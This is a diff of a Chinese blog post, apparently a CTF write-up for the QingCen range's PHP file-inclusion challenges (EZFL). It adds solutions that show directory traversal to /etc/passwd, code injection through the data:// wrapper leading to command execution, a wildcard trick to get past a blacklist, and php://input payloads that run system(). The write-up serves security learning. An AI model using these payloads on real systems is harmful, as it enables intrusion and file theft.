@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL(PHP 文件包含) 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n">
 <title>QingCen靶场Web入门wp-中</title>
 
 <link rel='canonical' href='https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp-%E4%B8%AD/'>
 
 <link rel="stylesheet" href="/scss/style.min.792c36f70fdd2d82eb85abdd638d265195c5df1693f8163637a98cf447af6d36.css"><meta property='og:title' content="QingCen靶场Web入门wp-中">
-<meta property='og:description' content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n">
+<meta property='og:description' content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL(PHP 文件包含) 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n">
 <meta property='og:url' content='https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp-%E4%B8%AD/'>
 <meta property='og:site_name' content='ChenOvo'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='wp' /><meta property='article:tag' content='web' /><meta property='article:published_time' content='2026-04-28T15:34:23&#43;08:00'/><meta property='article:modified_time' content='2026-04-28T15:34:23&#43;08:00'/><meta property='og:image' content='https://xxchen-yu.github.io/img/qingcenctf-cover.svg' />
 <meta name="twitter:title" content="QingCen靶场Web入门wp-中">
-<meta name="twitter:description" content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="前言 继续~ 继续~ 鸽了好久\nEZFL EZFL(PHP 文件包含) 访问靶机 先随便点点，没有发现什么特殊交互和信息，看一下注释 发现两行特别注释\n第一条注释确认了后端使用 include($file) 进行文件包含\n第二条 Base64 解码后为：flag is in /flag.txt\n由于后端 include() 没有对 $file 做路径限制\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://xxchen-yu.github.io/img/qingcenctf-cover.svg' />
     <link rel="shortcut icon" href="/favicon.png" />
 <link rel="stylesheet" href="/css/custom.css">
@@ -272,10 +272,10 @@
     <li><a href="#前言">前言</a></li>
     <li><a href="#ezfl">EZFL</a>
       <ol>
-        <li><a href="#ezfl-1">EZFL</a></li>
-        <li><a href="#ezfl_1">EZFL_1</a></li>
-        <li><a href="#ezfl_2">EZFL_2</a></li>
-        <li><a href="#ezfl_3">EZFL_3</a></li>
+        <li><a href="#ezflphp-文件包含">EZFL(PHP 文件包含)</a></li>
+        <li><a href="#ezfl_1php-文件包含--phpfilter-伪协议读取源码">EZFL_1(PHP 文件包含 + php://filter 伪协议读取源码)</a></li>
+        <li><a href="#ezfl_2php-文件包含--phpfilter-伪协议读取源码--base64过滤绕过">EZFL_2(PHP 文件包含 + php://filter 伪协议读取源码 + base64过滤绕过)</a></li>
+        <li><a href="#ezfl_3lfi---phpinput---rce">EZFL_3(LFI -&gt; php://input -&gt; RCE)</a></li>
         <li><a href="#ezfl_4">EZFL_4</a></li>
         <li><a href="#ezfl_5">EZFL_5</a></li>
         <li><a href="#ezfl_6">EZFL_6</a></li>
@@ -443,7 +443,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -460,7 +460,7 @@
 
 
 
-                <span class="article-time--wordcount">767 字</span>
+                <span class="article-time--wordcount">1242 字</span>
             </div>
         
     </footer>
@@ -477,7 +477,7 @@
     <h2 id="前言">前言
 </h2><p>继续~ 继续~ 鸽了好久</p>
 <h2 id="ezfl">EZFL
-</h2><h3 id="ezfl-1">EZFL
+</h2><h3 id="ezflphp-文件包含">EZFL(PHP 文件包含)
 </h3><p>访问靶机
 <img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780064985077_fl_1.png"
 	
@@ -532,7 +532,7 @@
 	
 	
 ></p>
-<h3 id="ezfl_1">EZFL_1
+<h3 id="ezfl_1php-文件包含--phpfilter-伪协议读取源码">EZFL_1(PHP 文件包含 + php://filter 伪协议读取源码)
 </h3><p>访问靶机<br>
 <img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780064985379_fl1_1.png"
 	
@@ -599,7 +599,7 @@ Base64 解码后：&ldquo;The flag is right in flag.php, but you&rsquo;ll never 
 	
 	
 ></p>
-<h3 id="ezfl_2">EZFL_2
+<h3 id="ezfl_2php-文件包含--phpfilter-伪协议读取源码--base64过滤绕过">EZFL_2(PHP 文件包含 + php://filter 伪协议读取源码 + base64过滤绕过)
 </h3><p>访问靶机<br>
 <img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780064990719_fl2_1.png"
 	
@@ -643,7 +643,7 @@ Base64 解码后：&ldquo;The flag is right in flag.php, but you&rsquo;ll never 
 	
 	
 ></p>
-<h3 id="ezfl_3">EZFL_3
+<h3 id="ezfl_3lfi---phpinput---rce">EZFL_3(LFI -&gt; php://input -&gt; RCE)
 </h3><p>访问首页  和前面题目一样 首页没有可交互的地方，那就看一下注释<br>
 <img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780728358343_fl3_1.png"
 	
@@ -748,8 +748,148 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 ><br>
 成功获得flag</p>
 <h3 id="ezfl_4">EZFL_4
-</h3><h3 id="ezfl_5">EZFL_5
-</h3><h3 id="ezfl_6">EZFL_6
+</h3><p>访问首页 和前面题目一样 首页没有可交互的地方 直接看注释 注释也一样 让我们自己往下做<br>
+文件包含题 直接目录穿越</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://docker.qingcen.net:49138/?file=../../../../etc/passwd  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780733504547_fl4_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl4_1.png"
+	
+	
+><br>
+成功读到 /etc/passwd，说明这里是一个可利用的 LFI。接着尝试直接读源码，比如 index.php 或 php://filter<br>
+都会返回 php not allowed，说明程序对 file 参数里的 php 做了黑名单过滤<br>
+继续测试发现 data:// 没被拦，而且能被 include</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://docker.qingcen.net:49138/?file=data://text/plain,Chen  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780733503815_fl4_2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl4_2.png"
+	
+	
+><br>
+既然 include(data://&hellip;) 成立，就可以直接注入 PHP 代码拿 RCE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://docker.qingcen.net:49138/?file=data://text/plain,%3C?=%60id%60?%3E  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780733498218_fl4_3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl4_3.png"
+	
+	
+><br>
+返回 uid=33(www-data)，说明命令执行成功。随后枚举站点目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">49138</span><span class="o">/</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="o">%</span><span class="mi">3</span><span class="n">C</span><span class="err">?</span><span class="o">=%</span><span class="mi">60</span><span class="n">ls</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">la</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">%</span><span class="mi">202</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">261</span><span class="o">%</span><span class="mi">60</span><span class="err">?</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780733500825_fl4_4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl4_4.png"
+	
+	
+><br>
+发现根目录下有 flag.php。由于 file 参数里不能出现明文 php，这里用 shell 通配符绕过黑名单，直接读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">49138</span><span class="o">/</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="o">%</span><span class="mi">3</span><span class="n">C</span><span class="err">?</span><span class="o">=%</span><span class="mi">60</span><span class="n">cat</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fla</span><span class="o">*%</span><span class="mi">202</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">261</span><span class="o">%</span><span class="mi">60</span><span class="err">?</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780733497278_fl4_5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl4_5.png"
+	
+	
+><br>
+最后flag在源码里</p>
+<h3 id="ezfl_5">EZFL_5
+</h3><p>访问首页  和前面题目一样 首页没有可交互的地方 直接看注释 注释也一样 让我们自己往下做<br>
+先尝试常见的伪协议包含</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=data://,&lt;?php system(&#39;ls&#39;);?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780737436169_fl5_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl5_1.png"
+	
+	
+><br>
+返回 data not allowed，说明题目对 data:// 做了过滤<br>
+既然只过滤了 data，就换用另一个 PHP 伪协议 php://input。php://input 可以读取原始 POST 数据，而 include() 在包含它时会把其中的 PHP 代码当作脚本执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;cat flag.php&#39;);?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780737439991_fl5_2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl5_2.png"
+	
+	
+><br>
+获得flag</p>
+<h3 id="ezfl_6">EZFL_6
 </h3><h2 id="ezfu">EZFU
 </h2><h3 id="ezfu-1">EZFU
 </h3><h3 id="ezfu_1">EZFU_1
